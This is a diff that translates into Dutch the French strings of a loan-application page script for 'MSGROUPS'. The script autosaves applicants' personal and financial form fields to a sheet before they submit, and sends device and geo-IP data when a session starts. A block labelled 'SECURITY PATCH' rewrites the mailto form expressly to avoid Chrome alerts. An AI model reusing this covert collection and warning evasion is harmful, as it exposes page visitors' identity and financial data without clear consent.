+        if (document.getElementById('piece3')?.checked) pieces.push('recent bankafschrift');
 
         const mensualite = calculerMensualite(montantVal, parseInt(dureeMois || '0', 10), CONFIG.tauxInteret);
         const mensualiteFmt = formatEuros(isFinite(mensualite) ? mensualite : 0);
 
-        const subject = `demande de financement ${montantFmt} ${nom} ${prenom}`.trim();
+        const subject = `financieringsaanvraag ${montantFmt} ${nom} ${prenom}`.trim();
 
         const lines = [
-            'Bonjour,',
+            'Beste,',
             '',
-            'Je me permets de vous contacter pour une demande de financement auprès de MSGROUPS.',
-            `Je m’appelle ${fullName || '—'}, né(e) le ${dateNaissance || '—'}, et je réside en ${pays || '—'}.`,
-            `Je souhaite obtenir un financement d’un montant de ${montantFmt} sur ${dureeMois || '—'} mois${raison ? ` pour ${raison}.` : '.'}`,
-            `Ma mensualité estimée (taux indicatif ${CONFIG.tauxInteret} %/an) serait de ${mensualiteFmt}.`,
+            'Ik neem contact met u op voor een financieringsaanvraag bij MSGROUPS.',
+            `Mijn naam is ${fullName || '—'}, geboren op ${dateNaissance || '—'}, en ik woon in ${pays || '—'}.`,
+            `Ik wil een financiering verkrijgen van ${montantFmt} over ${dureeMois || '—'} maanden${raison ? ` voor ${raison}.` : '.'}`,
+            `Mijn geschatte maandtermijn (indicatieve rente ${CONFIG.tauxInteret} %/jaar) bedraagt ${mensualiteFmt}.`,
             '',
-            'Voici mes coordonnées pour tout complément d’information :',
-            `• E-mail : ${email || '—'}`,
+            'Mijn contactgegevens voor eventuele vragen:',
+            `• E-mail: ${email || '—'}`,
             '',
-            `• WhatsApp : ${whatsapp || '—'}`,
+            `• WhatsApp: ${whatsapp || '—'}`,
             '',
-            `Côté situation : je suis actuellement ${statut || '—'}${revenus ? ` et ${revenus.toLowerCase()}` : ''}.`,
-            `J’ai à disposition ${pieces.length ? `ma ${pieces.join(' et ')}` : 'les pièces nécessaires sur demande'}.`,
+            `Situatie: ik ben momenteel ${statut || '—'}${revenus ? ` en ${revenus.toLowerCase()}` : ''}.`,
+            `Beschikbare documenten: ${pieces.length ? pieces.join(' en ') : 'op verzoek beschikbaar'}.`,
             '',
-            'Je reste bien entendu à votre disposition pour tout renseignement ou document supplémentaire.',
+            'Ik sta natuurlijk ter beschikking voor verdere informatie of aanvullende documenten.',
             '',
-            'Bien cordialement,',
+            'Met vriendelijke groet,',
             `${fullName || ''}`
         ];
         const body = lines.join('\n');
@@ -995,7 +997,7 @@
         return mailto;
     }
 
-    // ====== SECURITY PATCH: neutralise l'action "mailto:" pour éviter l'alerte Chrome
+    // ====== SECURITY PATCH: neutraliseert de "mailto:"-actie om Chrome-alerts te vermijden
     const form = document.querySelector('form[action^="mailto"], form[action*="mailto"]') || document.getElementById('lead-form');
     if (form) {
         try {
@@ -1017,7 +1019,7 @@
             if (CONFIG.debugMode) console.warn('SECURITY PATCH form rewrite error:', e);
         }
     }
-    // ====== FIN SECURITY PATCH ======
+    // ====== EINDE SECURITY PATCH ======
 
     if (form) {
         form.addEventListener('submit', function(e) {
@@ -1030,22 +1032,22 @@
             if (!formState.step1Valid || !formState.step2Valid || !formState.step3Valid) {
                 let allErrors = [];
                 if (formState.validationErrors.step1.length > 0) {
-                    allErrors.push('ÉTAPE 1 - Informations de base :');
+                    allErrors.push('STAP 1 - Basisinformatie:');
                     allErrors.push(...formState.validationErrors.step1.map(er => '  • ' + er));
                 }
                 if (formState.validationErrors.step2.length > 0) {
-                    allErrors.push('\nÉTAPE 2 - Votre prêt :');
+                    allErrors.push('\nSTAP 2 - Uw lening:');
                     allErrors.push(...formState.validationErrors.step2.map(er => '  • ' + er));
                 }
                 if (formState.validationErrors.step3.length > 0) {
-                    allErrors.push('\nÉTAPE 3 - Votre profil :');
+                    allErrors.push('\nSTAP 3 - Uw profiel:');
                     allErrors.push(...formState.validationErrors.step3.map(er => '  • ' + er));
                 }
-                showNotification('Formulaire incomplet', 'Veuillez corriger les erreurs suivantes :\n\n' + allErrors.join('\n'), 'error');
+                showNotification('Onvolledig formulier', 'Corrigeer de volgende fouten:\n\n' + allErrors.join('\n'), 'error');
                 return false;
             }
 
-            // Envoie un dernier autosave complet juste avant le mailto + flag CTA
+            // Laatste autosave vlak voor mailto + CTA-vlag
             const label = (document.querySelector('.cta-submit')?.textContent || '').trim() || 'cta_submit';
             sendCTAEventToSheet(label);
 
@@ -1053,7 +1055,7 @@
             window.location.href = mailtoLink;
 
             setTimeout(() => {
-                showNotification('✅ Demande prête dans votre messagerie', 'Veuillez vérifier votre application e-mail (brouillon ouvert).', 'success');
+                showNotification('✅ Aanvraag klaar in uw e-mail', 'Controleer uw e-mailapp (concept geopend).', 'success');
             }, 600);
         });
     }
@@ -1088,13 +1090,13 @@
         updateDots();
     }
 
-    // ========== NOTIFICATIONS ==========
+    // ========== MELDINGEN ==========
     function showNotification(title, message, type = 'info') {
         const icons = { info: 'ℹ️', success: '✅', warning: '⚠️', error: '❌' };
         alert(`${icons[type]} ${title}\n\n${message}`);
     }
 
-    // ========== SMOOTH SCROLL ==========
+    // ========== SOEPEL SCROLLEN ==========
     function enableSmoothScroll() {
         const style = document.createElement('style');
         style.textContent = `html { scroll-behavior: smooth; }`;
@@ -1115,7 +1117,7 @@
         });
     });
 
-    // ========== MENU MOBILE ==========
+    // ========== MOBIEL MENU ==========
     const menuToggle = document.getElementById('menu-toggle');
     if (menuToggle) {
         document.addEventListener('click', function(e) {
@@ -1133,7 +1135,7 @@
     }
 
     // ========================================
-    // 14. COLLECTE + ENVOI → SHEET (AJOUTÉ)
+    // 14. VERZAMELEN + VERSTUREN → SHEET (TOEGEVOEGD)
     // ========================================
 
     // Parse UTM + referrer + landing
@@ -1149,20 +1151,20 @@
         };
     }
 
-    // Device / navigateur / écran
+    // Device / browser / scherm
     function deviceInfo() {
         const ua = navigator.userAgent || navigator.userAgentData || '';
         const platform = navigator.platform || '';
         const lang = (navigator.language || (navigator.languages && navigator.languages[0]) || '').toLowerCase();
-        const tzOffsetMin = (new Date()).getTimezoneOffset(); // minutes
+        const tzOffsetMin = (new Date()).getTimezoneOffset(); // minuten
 
-        // Détection simple
+        // Eenvoudige detectie
         let device_type = 'desktop';
         const w = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
         if (w <= 768) device_type = 'mobile';
         else if (w > 768 && w <= 1024) device_type = 'tablet';
 
-        // OS & browser (très basique)
+        // OS & browser (zeer basaal)
         let os = /Windows/i.test(ua) ? 'Windows'
               : /Mac/i.test(ua) ? 'macOS'
               : /Android/i.test(ua) ? 'Android'
@@ -1192,9 +1194,9 @@
         };
     }
 
-    // Geo IP (best-effort, sans clé) — ipapi.co
+    // Geo IP (best effort, zonder sleutel) — ipapi.co
     function fetchGeoAndSendOnce(basePayload) {
-        // On tente un appel réseau ; si ça échoue, on envoie sans géo
+        // We proberen een netwerkcall; als het mislukt, versturen we zonder geo
         fetch('https://ipapi.co/json/', { method: 'GET' })
             .then(r => r.ok ? r.json() : null)
             .then(data => {
@@ -1209,9 +1211,9 @@
             });
     }
 
-    // Construit un snapshot des champs formulaire
+    // Snapshot van formulierwaarden
     function readFormSnapshot() {
-        // Champs étape 1
+        // Stap 1
         const prenom = (document.getElementById('prenom')?.value || '').trim();
         const nom = (document.getElementById('nom')?.value || '').trim();
         const email = (document.getElementById('email')?.value || '').trim();
@@ -1219,20 +1221,20 @@
         const pays = (document.getElementById('pays')?.value || '').trim();
         const dateNaissance = (document.getElementById('date-naissance')?.value || '').trim();
 
-        // Étape 2
+        // Stap 2
         const montant = Number(document.getElementById('montant')?.value || '') || '';
         const duree = Number(document.getElementById('duree')?.value || '') || '';
         const raison = (document.getElementById('raison')?.value || '').trim();
 
-        // Étape 3
+        // Stap 3
         const statut = (document.getElementById('statut')?.value || '').trim();
         const revenus = (document.getElementById('revenus')?.value || '').trim();
 
-        // Pièces (enchaînées)
+        // Documenten (samengevoegd)
         const pieces = [];
-        if (document.getElementById('piece1')?.checked) pieces.push('Carte d\'identité');
-        if (document.getElementById('piece2')?.checked) pieces.push('Preuve de revenus');
-        if (document.getElementById('piece3')?.checked) pieces.push('Relevé bancaire récent');
+        if (document.getElementById('piece1')?.checked) pieces.push('Identiteitskaart');
+        if (document.getElementById('piece2')?.checked) pieces.push('Inkomensbewijs');
+        if (document.getElementById('piece3')?.checked) pieces.push('Recent bankafschrift');
 
         return {
             form_prenom: prenom,
@@ -1246,11 +1248,11 @@
             form_raison: raison,
             form_statut: statut,
             form_revenus: revenus,
-            form_pieces: pieces.join(' et ')
+            form_pieces: pieces.join(' en ')
         };
     }
 
-    // Throttle/dé-bounce simple pour autosave (éviter spam)
+    // Throttle/debounce voor autosave (spam voorkomen)
     let autosaveTimer = null;
     function autosaveToSheet() {
         clearTimeout(autosaveTimer);
@@ -1264,7 +1266,7 @@
         }, 400);
     }
 
-    // Envoi CTA
+    // CTA-event
     function sendCTAEventToSheet(label) {
         const payload = Object.assign({
             session_id: SESSION.id,
@@ -1275,7 +1277,7 @@
         postToSheet(payload);
     }
 
-    // Premier envoi "session_start" (avec device + acquisition + ts_open)
+    // Eerste "session_start" (met device + acquisition + ts_open)
     function sendSessionStart() {
         const acq = parseAcquisition();
         const dev = deviceInfo();
@@ -1285,15 +1287,15 @@
             last_event: 'session_start'
         }, acq, dev);
 
-        // Essaye d'ajouter la géo IP ; si KO on envoie quand même
+        // Probeer Geo IP toe te voegen; zo niet, toch versturen
         fetchGeoAndSendOnce(base);
     }
 
     // ========================================
-    // INITIALISATION
+    // INITIALISATIE
     // ========================================
     function init() {
-        console.log('🚀 Initialisation MSGROUPS (sans stockage local)...');
+        console.log('🚀 Initialisatie MSGROUPS (zonder lokale opslag)...');
 
         enableSmoothScroll();
         setupPromoBannerTimer();
@@ -1302,7 +1304,7 @@
         setupVideoPlayers();
         injectSummaryHitboxStyles();
 
-        // Envoi d'ouverture de session (avec device/referrer/utm/géo)
+        // Sessiestart versturen (met device/referrer/utm/geo)
         sendSessionStart();
 
         setTimeout(() => {
@@ -1315,11 +1317,11 @@
         preventStepOpening();
         setupRealTimeValidation();
 
-        // Autosave si sliders bougent (déjà appelés dans validateStep2, mais on redonde à la marge)
+        // Autosave als sliders veranderen (al aangeroepen in validateStep2, extra zekerheid)
         if (montantSlider) montantSlider.addEventListener('change', autosaveToSheet);
         if (dureeSlider) dureeSlider.addEventListener('change', autosaveToSheet);
 
-        console.log('✅ MSGROUPS - Prêt !  Session:', SESSION.id);
+        console.log('✅ MSGROUPS - Klaar!  Sessie:', SESSION.id);
     }
 
     if (document.readyState === 'loading') {
